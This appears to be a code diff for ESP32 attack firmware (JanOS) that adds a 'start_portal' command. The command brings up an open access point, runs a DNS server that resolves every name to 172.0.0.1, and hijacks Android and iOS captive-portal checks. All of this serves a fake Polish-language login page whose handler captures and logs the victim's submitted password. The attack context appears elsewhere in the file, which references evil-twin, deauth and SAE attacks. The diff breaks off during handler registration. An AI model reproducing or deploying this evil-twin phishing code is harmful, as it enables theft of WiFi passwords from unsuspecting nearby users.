@@ -43,6 +43,14 @@
 #include "mbedtls/entropy.h"
 #include "esp_timer.h"
 
+#include "esp_http_server.h"
+#include "esp_netif.h"
+#include "lwip/err.h"
+#include "lwip/sys.h"
+#include "lwip/netdb.h"
+#include "lwip/dns.h"
+#include "lwip/dhcp.h"
+
 //Version number
 #define JANOS_VERSION "0.0.4"
 
@@ -163,6 +171,16 @@ static volatile bool sae_attack_active = false;
 // Wardrive task
 static TaskHandle_t wardrive_task_handle = NULL;
 
+// Portal state
+static httpd_handle_t portal_server = NULL;
+static volatile bool portal_active = false;
+static TaskHandle_t dns_server_task_handle = NULL;
+static int dns_server_socket = -1;
+
+// DNS server configuration
+#define DNS_PORT 53
+#define DNS_MAX_PACKET_SIZE 512
+
 // Dual-band channel list (2.4GHz + 5GHz like Marauder)
 static const int dual_band_channels[] = {
     // 2.4GHz channels
@@ -245,6 +263,7 @@ static int cmd_show_sniffer_results(int argc, char **argv);
 static int cmd_show_probes(int argc, char **argv);
 static int cmd_sniffer_debug(int argc, char **argv);
 static int cmd_start_blackout(int argc, char **argv);
+static int cmd_start_portal(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
 static int cmd_reboot(int argc, char **argv);
 static esp_err_t start_background_scan(void);
@@ -259,6 +278,8 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
 static void deauth_attack_task(void *pvParameters);
 static void blackout_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
+// DNS server task
+static void dns_server_task(void *pvParameters);
 // Sniffer functions
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void sniffer_process_scan_results(void);
@@ -355,6 +376,7 @@ static void wifi_event_handler(void *event_handler_arg,
                                int32_t event_id,
                                void *event_data) {
     if (event_base == WIFI_EVENT) {
+        MY_LOG_INFO(TAG, "WiFi event: %ld", event_id);
         switch (event_id) {
         case WIFI_EVENT_STA_CONNECTED: {
             const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)event_data;
@@ -363,6 +385,95 @@ static void wifi_event_handler(void *event_handler_arg,
                      e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
             MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
             applicationState = IDLE;
+            break;
+        }
+        case WIFI_EVENT_AP_STACONNECTED: {
+            const wifi_event_ap_staconnected_t *e = (const wifi_event_ap_staconnected_t *)event_data;
+            MY_LOG_INFO(TAG, "AP: Client connected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
+                       e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
+            
+            // Log DHCP lease information if available
+            esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+            if (ap_netif) {
+                esp_netif_ip_info_t ip_info;
+                esp_netif_get_ip_info(ap_netif, &ip_info);
+                MY_LOG_INFO(TAG, "AP IP: %lu.%lu.%lu.%lu", 
+                           ip_info.ip.addr & 0xFF,
+                           (ip_info.ip.addr >> 8) & 0xFF,
+                           (ip_info.ip.addr >> 16) & 0xFF,
+                           (ip_info.ip.addr >> 24) & 0xFF);
+                MY_LOG_INFO(TAG, "AP Gateway: %lu.%lu.%lu.%lu", 
+                           ip_info.gw.addr & 0xFF,
+                           (ip_info.gw.addr >> 8) & 0xFF,
+                           (ip_info.gw.addr >> 16) & 0xFF,
+                           (ip_info.gw.addr >> 24) & 0xFF);
+                MY_LOG_INFO(TAG, "AP Netmask: %lu.%lu.%lu.%lu", 
+                           ip_info.netmask.addr & 0xFF,
+                           (ip_info.netmask.addr >> 8) & 0xFF,
+                           (ip_info.netmask.addr >> 16) & 0xFF,
+                           (ip_info.netmask.addr >> 24) & 0xFF);
+                
+                // Wait a bit for DHCP to assign IP
+                vTaskDelay(pdMS_TO_TICKS(3000));
+                MY_LOG_INFO(TAG, "Waiting for client to make HTTP requests...");
+                
+                // Check if client got an IP address by checking DHCP lease
+                MY_LOG_INFO(TAG, "Checking if client received IP address...");
+                MY_LOG_INFO(TAG, "Client MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
+                           e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
+                
+                // Check if client got an IP address by trying to ping
+                MY_LOG_INFO(TAG, "If client got IP, it should be able to reach 172.0.0.1");
+                MY_LOG_INFO(TAG, "Client should try to access: http://172.0.0.1/");
+                MY_LOG_INFO(TAG, "Client should try Android detection: http://172.0.0.1/generate_204");
+                MY_LOG_INFO(TAG, "Client should try iOS detection: http://172.0.0.1/hotspot-detect.html");
+                MY_LOG_INFO(TAG, "Client should try RFC 8908 API: http://172.0.0.1/captive-portal/api");
+                
+                // DHCP server should be running
+                MY_LOG_INFO(TAG, "DHCP server should be running and assigning IP addresses");
+                
+                // Log DHCP server configuration
+                MY_LOG_INFO(TAG, "DHCP server is configured to assign IPs in range 172.0.0.2-172.0.0.254");
+                MY_LOG_INFO(TAG, "DNS server will redirect all queries to 172.0.0.1");
+                
+                // Check if client got an IP address by trying to ping
+                MY_LOG_INFO(TAG, "If client got IP, it should be able to reach 172.0.0.1");
+                MY_LOG_INFO(TAG, "Client should try to access: http://172.0.0.1/");
+                MY_LOG_INFO(TAG, "Client should try Android detection: http://172.0.0.1/generate_204");
+                MY_LOG_INFO(TAG, "Client should try iOS detection: http://172.0.0.1/hotspot-detect.html");
+                MY_LOG_INFO(TAG, "Client should try RFC 8908 API: http://172.0.0.1/captive-portal/api");
+                
+                // Check if client got an IP address
+                esp_netif_ip_info_t client_ip_info;
+                if (esp_netif_get_ip_info(ap_netif, &client_ip_info) == ESP_OK) {
+                    MY_LOG_INFO(TAG, "AP IP in hex: 0x%08lX", client_ip_info.ip.addr);
+                    
+                    // Calculate correct IP range for DHCP clients
+                    // ESP-IDF stores IP in little-endian format
+                    uint32_t base_ip = client_ip_info.ip.addr;
+                    uint32_t first_client_ip = (base_ip & 0x00FFFFFF) | 0x02000000;  // 172.0.0.2
+                    uint32_t last_client_ip = (base_ip & 0x00FFFFFF) | 0xFE000000;   // 172.0.0.254
+                    
+                    MY_LOG_INFO(TAG, "First client IP in hex: 0x%08lX", first_client_ip);
+                    MY_LOG_INFO(TAG, "Last client IP in hex: 0x%08lX", last_client_ip);
+                    
+                    MY_LOG_INFO(TAG, "DHCP client IP range: %lu.%lu.%lu.%lu - %lu.%lu.%lu.%lu", 
+                               first_client_ip & 0xFF,
+                               (first_client_ip >> 8) & 0xFF,
+                               (first_client_ip >> 16) & 0xFF,
+                               (first_client_ip >> 24) & 0xFF,
+                               last_client_ip & 0xFF,
+                               (last_client_ip >> 8) & 0xFF,
+                               (last_client_ip >> 16) & 0xFF,
+                               (last_client_ip >> 24) & 0xFF);
+                }
+            }
+            break;
+        }
+        case WIFI_EVENT_AP_STADISCONNECTED: {
+            const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
+            MY_LOG_INFO(TAG, "AP: Client disconnected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
+                       e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
             break;
         }
         case WIFI_EVENT_SCAN_DONE: {
@@ -1477,6 +1588,57 @@ static int cmd_stop(int argc, char **argv) {
         }
     }
     
+    // Stop portal if active
+    if (portal_active) {
+        MY_LOG_INFO(TAG, "Stopping portal...");
+        portal_active = false;
+        
+        // Stop DNS server task
+        if (dns_server_task_handle != NULL) {
+            MY_LOG_INFO(TAG, "Stopping DNS server task...");
+            
+            // Wait for DNS task to finish (it checks portal_active flag)
+            for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
+                vTaskDelay(pdMS_TO_TICKS(100));
+            }
+            
+            // Force cleanup if still running
+            if (dns_server_task_handle != NULL) {
+                vTaskDelete(dns_server_task_handle);
+                dns_server_task_handle = NULL;
+                if (dns_server_socket >= 0) {
+                    close(dns_server_socket);
+                    dns_server_socket = -1;
+                }
+                MY_LOG_INFO(TAG, "DNS server task forcefully stopped.");
+            } else {
+                MY_LOG_INFO(TAG, "DNS server task stopped.");
+            }
+        }
+        
+        // Stop HTTP server
+        if (portal_server != NULL) {
+            httpd_stop(portal_server);
+            portal_server = NULL;
+            MY_LOG_INFO(TAG, "HTTP server stopped.");
+        }
+        
+        // Stop DHCP server
+        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+        if (ap_netif) {
+            esp_err_t dhcp_ret = esp_netif_dhcps_stop(ap_netif);
+            if (dhcp_ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to stop DHCP server: %s", esp_err_to_name(dhcp_ret));
+            } else {
+                MY_LOG_INFO(TAG, "DHCP server stopped.");
+            }
+        }
+        
+        // Stop AP mode
+        esp_wifi_stop();
+        MY_LOG_INFO(TAG, "Portal stopped.");
+    }
+    
     // Clear LED (ignore errors if LED is in invalid state)
     esp_err_t led_err = led_strip_clear(strip);
     if (led_err == ESP_OK) {
@@ -1932,6 +2094,668 @@ static int cmd_start_wardrive(int argc, char **argv) {
     return 0;
 }
 
+// HTML form for password input
+static const char* portal_html = 
+"<!DOCTYPE html>"
+"<html>"
+"<head>"
+"<meta charset='UTF-8'>"
+"<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+"<title>Portal Access</title>"
+"<style>"
+"body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+"h1 { text-align: center; color: #333; margin-bottom: 30px; }"
+"form { display: flex; flex-direction: column; }"
+"input[type='password'] { padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }"
+"button { padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }"
+"button:hover { background: #0056b3; }"
+"</style>"
+"<script>"
+"// Auto-redirect for captive portal detection"
+"if (window.location.hostname !== '172.0.0.1') {"
+"    window.location.href = 'http://172.0.0.1/';"
+"}"
+"</script>"
+"</head>"
+"<body>"
+"<div class='container'>"
+"<h1>Portal Access</h1>"
+"<form method='POST' action='/login'>"
+"<input type='password' name='password' placeholder='Podaj hasło' required>"
+"<button type='submit'>Zaloguj</button>"
+"</form>"
+"</div>"
+"</body>"
+"</html>";
+
+// HTTP handler for login form
+static esp_err_t login_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Login handler called - URI: %s, Method: %s", req->uri, req->method == HTTP_POST ? "POST" : "GET");
+    MY_LOG_INFO(TAG, "Login handler called - processing password!");
+    
+    char buf[256];
+    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (ret <= 0) {
+        MY_LOG_INFO(TAG, "Failed to receive POST data");
+        return ESP_FAIL;
+    }
+    buf[ret] = '\0';
+    
+    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
+    
+    // Parse password from POST data
+    char *password_start = strstr(buf, "password=");
+    if (password_start) {
+        password_start += 9; // Skip "password="
+        char *password_end = strchr(password_start, '&');
+        if (password_end) {
+            *password_end = '\0';
+        }
+        
+        // URL decode the password
+        char decoded_password[64];
+        int decoded_len = 0;
+        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
+            if (*p == '%' && p[1] && p[2]) {
+                char hex[3] = {p[1], p[2], '\0'};
+                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
+                p += 2;
+            } else if (*p == '+') {
+                decoded_password[decoded_len++] = ' ';
+            } else {
+                decoded_password[decoded_len++] = *p;
+            }
+        }
+        decoded_password[decoded_len] = '\0';
+        
+        // Log the password
+        MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
+    }
+    
+    // Send success response
+    const char* response = 
+        "HTTP/1.1 200 OK\r\n"
+        "Content-Type: text/html\r\n"
+        "Content-Length: 200\r\n\r\n"
+        "<!DOCTYPE html><html><head><title>Success</title></head>"
+        "<body><h1>Login Successful!</h1><p>You can now access the internet.</p></body></html>";
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// HTTP handler for portal page
+static esp_err_t portal_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Portal page accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
+    MY_LOG_INFO(TAG, "Portal handler called - serving portal page!");
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// URI handler for captive portal redirection
+static esp_err_t captive_portal_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Captive portal redirect triggered for: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
+    MY_LOG_INFO(TAG, "Catch-all handler called - redirecting to portal!");
+    
+    // Log client IP (simplified - just log that we received a request)
+    MY_LOG_INFO(TAG, "HTTP request received from client");
+    
+    // Redirect all requests to our portal page
+    httpd_resp_set_status(req, "302 Found");
+    httpd_resp_set_hdr(req, "Location", "/portal");
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
+}
+
+// Handler for root path - most devices try to access this first
+static esp_err_t root_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Root path accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
+    
+    // Log client IP (simplified - just log that we received a request)
+    MY_LOG_INFO(TAG, "HTTP request received from client");
+    
+    // Add captive portal headers for Android/Samsung detection
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Connection", "close");
+    httpd_resp_set_hdr(req, "Content-Type", "text/html; charset=utf-8");
+    
+    // Check User-Agent for Android/Samsung
+    size_t user_agent_len = httpd_req_get_hdr_value_len(req, "User-Agent");
+    if (user_agent_len > 0) {
+        char user_agent[256];
+        if (httpd_req_get_hdr_value_str(req, "User-Agent", user_agent, sizeof(user_agent)) == ESP_OK) {
+            MY_LOG_INFO(TAG, "User-Agent: %s", user_agent);
+            
+            // If it's Android/Samsung, send special response
+            if (strstr(user_agent, "Android") || strstr(user_agent, "Samsung")) {
+                MY_LOG_INFO(TAG, "Android/Samsung device detected - sending captive portal response");
+                
+                // Send special response for Android captive portal detection
+                const char* android_response = 
+                    "<!DOCTYPE html><html><head><title>Portal</title></head>"
+                    "<body><h1>Portal Access Required</h1>"
+                    "<p>Please enter your password to continue.</p>"
+                    "<form method='POST' action='/login'>"
+                    "<input type='password' name='password' placeholder='Podaj hasło' required>"
+                    "<button type='submit'>Zaloguj</button>"
+                    "</form></body></html>";
+                
+                httpd_resp_send(req, android_response, HTTPD_RESP_USE_STRLEN);
+                return ESP_OK;
+            }
+        }
+    }
+    
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Handler for Android captive portal detection (generate_204)
+static esp_err_t android_captive_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Android captive portal detection: %s", req->uri);
+    MY_LOG_INFO(TAG, "Android handler called - this means client is trying to detect captive portal!");
+    
+    // Android expects a 204 No Content response for captive portal detection
+    // If we return 204, Android thinks internet works
+    // If we return 200 with HTML, Android thinks it's a captive portal
+    // So we return 200 with our portal HTML to trigger captive portal
+    httpd_resp_set_status(req, "200 OK");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Content-Type", "text/html");
+    
+    // Send our portal HTML to trigger captive portal
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Handler for iOS captive portal detection (hotspot-detect.html)
+static esp_err_t ios_captive_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "iOS captive portal detection: %s", req->uri);
+    MY_LOG_INFO(TAG, "iOS handler called - this means client is trying to detect captive portal!");
+    
+    // iOS expects specific content for captive portal detection
+    const char* ios_response = 
+        "<!DOCTYPE html><html><head><title>Success</title></head>"
+        "<body><h1>Success</h1></body></html>";
+    
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Content-Type", "text/html");
+    
+    httpd_resp_send(req, ios_response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Handler for common captive portal detection endpoints
+static esp_err_t captive_detection_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Captive portal detection endpoint accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
+    
+    // Add captive portal headers
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Connection", "close");
+    
+    // Check User-Agent for Android/Samsung
+    size_t user_agent_len = httpd_req_get_hdr_value_len(req, "User-Agent");
+    if (user_agent_len > 0) {
+        char user_agent[256];
+        if (httpd_req_get_hdr_value_str(req, "User-Agent", user_agent, sizeof(user_agent)) == ESP_OK) {
+            MY_LOG_INFO(TAG, "User-Agent: %s", user_agent);
+            
+            // If it's Android/Samsung, send special response
+            if (strstr(user_agent, "Android") || strstr(user_agent, "Samsung")) {
+                MY_LOG_INFO(TAG, "Android/Samsung device detected - sending captive portal response");
+                
+                // Send special response for Android captive portal detection
+                const char* android_response = 
+                    "<!DOCTYPE html><html><head><title>Portal</title></head>"
+                    "<body><h1>Portal Access Required</h1>"
+                    "<p>Please enter your password to continue.</p>"
+                    "<form method='POST' action='/login'>"
+                    "<input type='password' name='password' placeholder='Podaj hasło' required>"
+                    "<button type='submit'>Zaloguj</button>"
+                    "</form></body></html>";
+                
+                httpd_resp_send(req, android_response, HTTPD_RESP_USE_STRLEN);
+                return ESP_OK;
+            }
+        }
+    }
+    
+    // Return a simple response that indicates this is a captive portal
+    const char* response = 
+        "HTTP/1.1 200 OK\r\n"
+        "Content-Type: text/html\r\n"
+        "Content-Length: 200\r\n\r\n"
+        "<!DOCTYPE html><html><head><title>Captive Portal</title></head>"
+        "<body><h1>Portal Detected</h1><p>Please visit <a href='/portal'>/portal</a> to continue.</p></body></html>";
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// RFC 8908 Captive Portal API endpoint
+static esp_err_t captive_api_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "RFC 8908 Captive Portal API handler called - URI: %s", req->uri);
+    
+    // Set CORS headers
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
+    
+    // Handle preflight OPTIONS request
+    if (req->method == HTTP_OPTIONS) {
+        httpd_resp_set_status(req, "200 OK");
+        httpd_resp_set_type(req, "application/json");
+        httpd_resp_send(req, NULL, 0);
+        return ESP_OK;
+    }
+    
+    // RFC 8908 compliant JSON response
+    const char* json_response = 
+        "{"
+        "\"captive\": true,"
+        "\"user-portal-url\": \"http://172.0.0.1/portal\","
+        "\"venue-info-url\": \"http://172.0.0.1/portal\","
+        "\"is-portal\": true,"
+        "\"can-extend-session\": false,"
+        "\"seconds-remaining\": 0,"
+        "\"bytes-remaining\": 0"
+        "}";
+    
+    httpd_resp_set_status(req, "200 OK");
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, json_response, strlen(json_response));
+    
+    MY_LOG_INFO(TAG, "RFC 8908 API response sent: %s", json_response);
+    return ESP_OK;
+}
+
+// DNS server task for captive portal
+static void dns_server_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    struct sockaddr_in server_addr;
+    struct sockaddr_in client_addr;
+    socklen_t client_addr_len = sizeof(client_addr);
+    char rx_buffer[DNS_MAX_PACKET_SIZE];
+    char tx_buffer[DNS_MAX_PACKET_SIZE];
+    
+    MY_LOG_INFO(TAG, "DNS server task starting...");
+    
+    // Create UDP socket
+    dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (dns_server_socket < 0) {
+        MY_LOG_INFO(TAG, "Failed to create DNS socket: %d", errno);
+        dns_server_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    // Bind to DNS port 53
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    server_addr.sin_port = htons(DNS_PORT);
+    
+    int err = bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
+    if (err < 0) {
+        MY_LOG_INFO(TAG, "Failed to bind DNS socket: %d", errno);
+        close(dns_server_socket);
+        dns_server_socket = -1;
+        dns_server_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    // Set socket timeout so we can check portal_active flag periodically
+    struct timeval timeout;
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+    setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+    
+    MY_LOG_INFO(TAG, "DNS server listening on port %d", DNS_PORT);
+    
+    // Main DNS server loop
+    while (portal_active) {
+        int len = recvfrom(dns_server_socket, rx_buffer, sizeof(rx_buffer), 0,
+                          (struct sockaddr *)&client_addr, &client_addr_len);
+        
+        if (len < 0) {
+            if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                // Timeout, check portal_active flag and continue
+                continue;
+            }
+            MY_LOG_INFO(TAG, "DNS recvfrom error: %d", errno);
+            break;
+        }
+        
+        if (len < 12) {
+            // DNS header is at least 12 bytes
+            continue;
+        }
+        
+        // Build DNS response
+        // Copy transaction ID and flags from request
+        memcpy(tx_buffer, rx_buffer, 2); // Transaction ID
+        
+        // Set flags: Response, Authoritative, No Error
+        tx_buffer[2] = 0x81; // QR=1 (response), Opcode=0, AA=0, TC=0, RD=0
+        tx_buffer[3] = 0x80; // RA=1, Z=0, RCODE=0 (no error)
+        
+        // Copy question count (should be 1)
+        tx_buffer[4] = rx_buffer[4];
+        tx_buffer[5] = rx_buffer[5];
+        
+        // Answer count = 1
+        tx_buffer[6] = 0x00;
+        tx_buffer[7] = 0x01;
+        
+        // Authority RRs = 0
+        tx_buffer[8] = 0x00;
+        tx_buffer[9] = 0x00;
+        
+        // Additional RRs = 0
+        tx_buffer[10] = 0x00;
+        tx_buffer[11] = 0x00;
+        
+        // Copy the question section from the request
+        int question_len = 0;
+        int pos = 12;
+        while (pos < len && rx_buffer[pos] != 0) {
+            pos += rx_buffer[pos] + 1;
+        }
+        pos++; // Skip final 0
+        pos += 4; // Skip QTYPE and QCLASS
+        question_len = pos - 12;
+        
+        if (question_len > 0 && question_len < (DNS_MAX_PACKET_SIZE - 12 - 16)) {
+            memcpy(tx_buffer + 12, rx_buffer + 12, question_len);
+            
+            // Add answer section
+            int answer_pos = 12 + question_len;
+            
+            // Name pointer to question (compression)
+            tx_buffer[answer_pos++] = 0xC0;
+            tx_buffer[answer_pos++] = 0x0C;
+            
+            // TYPE = A (0x0001)
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x01;
+            
+            // CLASS = IN (0x0001)
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x01;
+            
+            // TTL = 60 seconds
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x3C;
+            
+            // Data length = 4 bytes
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x04;
+            
+            // IP address: 172.0.0.1
+            tx_buffer[answer_pos++] = 172;
+            tx_buffer[answer_pos++] = 0;
+            tx_buffer[answer_pos++] = 0;
+            tx_buffer[answer_pos++] = 1;
+            
+            // Send response
+            sendto(dns_server_socket, tx_buffer, answer_pos, 0,
+                  (struct sockaddr *)&client_addr, client_addr_len);
+        }
+    }
+    
+    // Clean up
+    MY_LOG_INFO(TAG, "DNS server task stopping...");
+    close(dns_server_socket);
+    dns_server_socket = -1;
+    dns_server_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// Start portal command
+static int cmd_start_portal(int argc, char **argv) {
+    (void)argc; (void)argv;
+    
+    // Check if portal is already running
+    if (portal_active) {
+        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
+        return 0;
+    }
+    
+    MY_LOG_INFO(TAG, "Starting captive portal...");
+    
+    // Get AP netif and stop DHCP to configure custom IP
+    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (!ap_netif) {
+        MY_LOG_INFO(TAG, "Failed to get AP netif");
+        return 1;
+    }
+    
+    // Stop DHCP server to configure custom IP
+    esp_netif_dhcps_stop(ap_netif);
+    
+    // Set static IP 172.0.0.1 for AP
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    
+    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
+    
+    // Configure AP
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "Portal",
+            .ssid_len = 6,
+            .channel = 1,
+            .password = "",
+            .max_connection = 4,
+            .authmode = WIFI_AUTH_OPEN
+        }
+    };
+    
+    // Start AP
+    ret = esp_wifi_set_mode(WIFI_MODE_AP);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set AP mode: %s", esp_err_to_name(ret));
+        return 1;
+    }
+    
+    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
+        return 1;
+    }
+    
+    ret = esp_wifi_start();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start AP: %s", esp_err_to_name(ret));
+        return 1;
+    }
+    
+    // Start DHCP server
+    ret = esp_netif_dhcps_start(ap_netif);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
+        esp_wifi_stop();
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "DHCP server started - clients will get IPs in 172.0.0.x range");
+    
+    // Wait a bit for AP to fully start
+    vTaskDelay(pdMS_TO_TICKS(1000));
+    
+    // Configure HTTP server
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.server_port = 80;
+    config.max_open_sockets = 7;
+    
+    // Start HTTP server
+    esp_err_t http_ret = httpd_start(&portal_server, &config);
+    if (http_ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
+        esp_wifi_stop();
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
+    
+    // Register URI handlers
+    // Root path handler - most devices try this first
+    httpd_uri_t root_uri = {
+        .uri = "/",
+        .method = HTTP_GET,
+        .handler = root_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &root_uri);
+    
+    // Root path handler for POST requests
+    httpd_uri_t root_post_uri = {
+        .uri = "/",
+        .method = HTTP_POST,
+        .handler = root_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &root_post_uri);
+    
+    // Portal page handler
+    httpd_uri_t portal_uri = {
+        .uri = "/portal",
+        .method = HTTP_GET,
+        .handler = portal_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &portal_uri);
+    
+    // Login handler
+    httpd_uri_t login_uri = {
+        .uri = "/login",
+        .method = HTTP_POST,
+        .handler = login_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &login_uri);
+    
+    // Android captive portal detection
+    httpd_uri_t android_captive_uri = {
+        .uri = "/generate_204",
+        .method = HTTP_GET,
+        .handler = android_captive_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &android_captive_uri);
+    
+    // iOS captive portal detection
+    httpd_uri_t ios_captive_uri = {
+        .uri = "/hotspot-detect.html",
+        .method = HTTP_GET,
+        .handler = ios_captive_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &ios_captive_uri);
+    
+    // Samsung captive portal detection
+    httpd_uri_t samsung_captive_uri = {
+        .uri = "/ncsi.txt",
+        .method = HTTP_GET,
+        .handler = captive_detection_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &samsung_captive_uri);
+    
+    // Catch-all handler for other requests
+    httpd_uri_t captive_uri = {
+        .uri = "/*",
+        .method = HTTP_GET,
+        .handler = captive_portal_handler,
+        .user_ctx = NULL
+    };
